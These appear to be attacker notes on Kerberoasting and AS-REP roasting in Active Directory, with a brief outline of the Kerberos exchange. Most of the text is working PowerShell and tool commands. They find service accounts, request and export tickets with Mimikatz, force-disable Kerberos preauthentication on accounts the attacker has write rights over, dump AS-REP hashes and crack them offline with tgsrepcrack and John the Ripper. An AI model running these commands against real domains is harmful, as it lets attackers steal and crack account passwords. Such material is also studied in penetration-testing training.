Kerberoasting happens by saving the TGS after step 4 in the Kerberos process. Since the TGS is encrypted with the service account's NTLM hash it makes it possible to attempt to brute force the password. 

Steps for Kerberos:


1. The user's password is converted to an NTLM hash which is used to encrypt a timestamp. This is sent to the KDC as an AS-REQ.

2. The TGT is encrypted signed and delivered back to the user as an AS-REP. Only the krbtgt user can open and read TGT data.

3. TGT is encrypted with krbtgt hash when requesting a TGS. TGS-REQ

4. TGS encrypted using target service's NTLM hash, TGS-REP

5. The user connects to the server hosting the service on the specific port and presents the TGS, AP-REQ

6. Optional mutual authentication



## Basic Kerberoast Process


Find service accounts

```powershell
#PowerView
Get-NetUser –SPN

#ActiveDirectorymodule
Get-ADUser -Filter{ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

From the output select a service name and input into the following command

```powershell
#Request a TGS
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/mgmt.abc.example.local"


#Request-SPNTicketfrom PowerView can be used as well for cracking with John or Hashcat. 

#Check if the TGS was granted:
klist

```

Export the ticket using Invoke-Mimikatz

```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```


Crack the service account password

```powershell
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~mgmt.abc.example.local-abc.example.LOCAL.kirbi 
```



## AS-REP


If a user accounts settings have "Do not require Kerberos preauthentication" enabled, it is possible to grab user's crackable AS-REP and brute force it offline

Enumerate accounts with Pre-Auth disabled

```powershell
#Using PowerView(dev):
Get-DomainUser -PreauthNotRequired -Verbose

#Using ActiveDirectorymodule:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

With suffecient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well
Force disable Kerberos Pre-Auth

```powershell
#enumerate the permissions for RDP Users on ACLs using PowerView(dev):
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```

Request encrypted AS-REP for offline brute force

```powershell
#Let's use ASREPRoast
Get-ASREPHash -UserName VPN1user -Verbose

#To enumerate all users with Kerberos preauthdisabled and request a hash
Invoke-ASREPRoast -Verbose
```

Crack the hashes

```powershell
#Using bleeding-jumbo branch of John The Ripper, we can brute-force the hashes offline. 
./john vpn1user.txt --wordlist=wordlist.txt
```
